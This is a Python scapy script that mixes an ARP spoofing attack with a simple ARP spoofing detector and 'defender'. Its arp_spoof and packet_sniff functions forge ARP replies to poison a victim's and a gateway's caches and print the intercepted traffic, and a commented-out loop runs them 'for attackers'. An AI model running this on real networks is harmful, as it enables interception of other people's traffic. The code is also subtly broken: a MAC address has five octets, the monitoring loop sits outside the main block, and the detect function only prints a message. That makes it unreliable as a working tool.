import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from netifaces import AF_INET, AF_INET6, ifaddresses, interfaces
import os
import time

#a template of addresses, for educational purposes only
interface = "eth0" #replace with your interface 
victim_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"
victim_mac = "00:11:22:33:44:55"
gateway_mac = "00:66:77:88:99"


#sends ARP packets to the victim and the gateway
def arp_spoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
    scapy.send(scapy.ARP(op=2,pdst = victim_ip, hwdst = victim_mac, psrc = gateway_ip), count = 5)
    scapy.send(scapy.ARP(op=2,pdst = gateway_ip, hwdst = gateway_mac, psrc = victim_ip), count = 5)

def packet_sniff(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == gateway_ip:
            print("Packet from victim to gateway: ")
            print(packet.show())
            #scapy.send(packet)
        #modify packet contents (e.g change dst IP)


#defense: restore the correct ARP table
def detect_arp_spoofing():
    print("Monitoring ARP table for suspicious activity.")



def arp_spoof_defender():
    print("🛠️\n Restoring ARP Table...")

    #Send correct ARP responses to all devices via broadcast transmission
    scapy.send(scapy.ARP(op=2,pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", psrc = victim_ip, hwsrc = victim_mac), count = 5)
    scapy.send(scapy.ARP(op=2,pdst = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", psrc = gateway_ip, hwsrc = gateway_mac), count = 5)

    #ARP entry to prevent further attacks
    os.system(f"arp -s {gateway_ip} {gateway_mac}") #Windows/Linux
    print("✅ Defense Activated: Static ARP Entry Set")

while True:
    arp_table = scapy.arping(gateway_ip, verbose = False)[0]
    for sent, received in arp_table:
        current_mac = received.hwsrc #extract the MAC address

        if current_mac != gateway_mac:
            print("⚠️\n ALERT! Possible ARP Spoofing Detected ⚠️")
            print(f"Expected Gateway MAC: {gateway_mac}")
            print(f"Detected MAC: {current_mac}")
            arp_spoof_defender()

    time.sleep(5)


if __name__ == "__main__":
    print("Starting ARP Spoofing & Detection Script...")


    #start spoofing and sniffing, for attackers
# while True:
#     arp_spoof(victim_ip, victim_mac, gateway_ip, gateway_mac)
#     scapy.sniff(iface = interface, prn = packet_sniff, store = False)

#start ARP spoofing detection, for defenders
detect_arp_spoofing()






        


